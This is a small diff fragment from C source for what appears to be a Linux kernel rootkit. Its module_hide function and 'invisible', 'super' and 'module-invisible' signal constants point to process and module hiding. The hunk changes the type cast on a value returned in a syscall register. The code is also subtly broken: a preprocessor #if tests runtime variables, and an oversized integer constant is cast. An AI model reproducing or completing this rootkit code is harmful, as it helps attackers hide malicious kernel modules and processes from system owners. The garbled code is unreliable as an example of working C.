@@ -309,7 +309,7 @@ module_hide(void)
 		int sig = (int) pt_regs->regs[1];
 	#endif
 	#if (pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS))//ADDED
-		pt_regs->regs[0] = (pid_t) 12345678901234567890;//ADDED
+		pt_regs->regs[0] = (long long) 12345678901234567890;//ADDED
 	#endif//ADDED
 #else
 asmlinkage int
